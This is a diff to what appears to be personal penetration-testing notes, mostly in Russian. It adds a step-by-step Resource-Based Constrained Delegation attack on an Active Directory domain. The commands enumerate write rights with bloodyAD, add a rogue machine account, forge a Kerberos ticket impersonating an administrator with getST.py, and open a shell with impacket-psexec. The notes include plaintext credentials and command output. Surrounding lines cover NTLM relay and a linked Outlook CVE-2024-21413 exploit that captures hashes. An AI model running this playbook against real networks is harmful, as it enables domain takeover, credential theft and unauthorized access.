@@ -43,6 +43,29 @@ sudo impacket-ntlmrelayx -tf nosigning.txt -smb2support -socks
 потом админ кликает на линку на шаре 
 socks
 
+
+# RBCD
+
+
+проверяем через bloodyAD 
+bloodyAD --host 10.154.16.134  -d edu.stf -u s_dotson  -p ricardo  get writable --otype USER --right WRITE --detail   
+вывод
+msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
+ nxc ldap  10.154.16.134  -u s_dotson -p ricardo -M maq       проверка maq  (возможность создать машинную учетную запись)
+addcomputer.py -computer-name 'EXPLORER$' -computer-pass 'Passw0rd123! ' -dc-ip 10.154.16.134 edu.stf/s_dotson:ricardo      
+вывод команды: [*] Successfully added machine account EXPLORER$ with password Passw0rd123! .
+добавляем в /etc/hosts   (комп s.dotson)
+10.154.16.196 sdotson.edu.stf
+getST.py -spn cifs/sdotson.edu.stf -impersonate s_moses_admin 'edu.stf/EXPLORER$:Passw0rd123! ' -dc-ip 10.154.16.135   
+вывод команды 
+[-] CCache file is not found. Skipping...
+ [*] Saving ticket in s_moses_admin@cifs_sdotson.edu.stf@EDU.STF.ccache
+export KRB5CCNAME='s_moses_admin@cifs_sdotson.edu.stf@EDU.STF.ccache'       
+impacket-psexec -k -no-pass 'edu.stf/s_moses_admin@sdotson.edu.stf'  
+
+
+
+
 # Exchange 
 https://github.com/duy-31/CVE-2024-21413
 ставим слушатель  (сюда приходит хэш после нажатия на ссылку)
